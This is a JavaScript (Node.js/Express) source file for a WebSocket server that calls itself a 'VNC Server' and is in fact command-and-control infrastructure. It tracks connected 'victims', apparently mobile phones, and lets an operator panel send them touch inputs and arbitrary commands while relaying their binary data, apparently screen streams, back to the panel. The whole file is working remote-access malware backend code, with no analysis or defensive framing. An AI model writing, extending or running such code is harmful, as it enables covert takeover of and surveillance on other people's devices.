const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const path = require('path');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const PORT = process.env.PORT || 8080;

// Victims & Panels
const victims = new Map();
const panels = new Set();

// Serve panel.html
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'panel.html'));
});

// WebSocket Connection
wss.on('connection', (ws, req) => {
    const clientIP = req.socket.remoteAddress;
    console.log(`🔗 New connection from ${clientIP}`);

    let clientType = null;
    let victimId = null;

    ws.on('message', (data) => {
        try {
            const message = data.toString();

            if (message.startsWith('REGISTER:')) {
                const type = message.replace('REGISTER:', '').trim();

                if (type === 'PANEL') {
                    clientType = 'panel';
                    panels.add(ws);
                    console.log('🖥️ Control Panel connected');
                    ws.send(JSON.stringify({ type: 'info', message: 'Connected as Control Panel' }));
                    const victimList = Array.from(victims.keys());
                    ws.send(JSON.stringify({ type: 'victimList', victims: victimList }));

                } else if (type.startsWith('VICTIM:')) {
                    clientType = 'victim';
                    victimId = type.replace('VICTIM:', '').trim() || `device_${Date.now()}`;
                    victims.set(victimId, ws);
                    console.log(`📱 Victim connected: ${victimId}`);
                    ws.send(JSON.stringify({ type: 'info', message: 'Connected as Victim' }));

                    panels.forEach(panel => {
                        panel.send(JSON.stringify({
                            type: 'victimConnected',
                            victimId: victimId
                        }));
                    });
                }
                return;
            }

            if (Buffer.isBuffer(data) || data instanceof ArrayBuffer) {
                panels.forEach(panel => {
                    if (panel.readyState === WebSocket.OPEN) {
                        panel.send(data);
                    }
                });
                return;
            }

            const command = JSON.parse(message);

            if (command.type === 'touch' && command.victimId) {
                const victimWs = victims.get(command.victimId);
                if (victimWs && victimWs.readyState === WebSocket.OPEN) {
                    victimWs.send(JSON.stringify({
                        type: 'touch',
                        x: command.x,
                        y: command.y
                    }));
                }
            } else if (command.type === 'command' && command.victimId) {
                const victimWs = victims.get(command.victimId);
                if (victimWs && victimWs.readyState === WebSocket.OPEN) {
                    victimWs.send(JSON.stringify(command));
                }
            }

        } catch (err) {
            if (Buffer.isBuffer(data) || data instanceof ArrayBuffer) {
                panels.forEach(panel => {
                    if (panel.readyState === WebSocket.OPEN) {
                        panel.send(data);
                    }
                });
            }
        }
    });

    ws.on('close', () => {
        console.log(`🔌 Connection closed: ${clientIP} (${clientType})`);

        if (clientType === 'victim' && victimId) {
            victims.delete(victimId);
            panels.forEach(panel => {
                panel.send(JSON.stringify({
                    type: 'victimDisconnected',
                    victimId: victimId
                }));
            });
        }

        if (clientType === 'panel') {
            panels.delete(ws);
        }
    });

    ws.on('error', (err) => {
        console.error('WebSocket error:', err);
    });
});

// Health Check
app.get('/health', (req, res) => {
    res.json({
        status: 'online',
        victims: victims.size,
        panels: panels.size
    });
});

server.listen(PORT, () => {
    console.log(`🔥 VNC Server running on port ${PORT}`);
    console.log(`📱 Panel: http://localhost:${PORT}`);
});
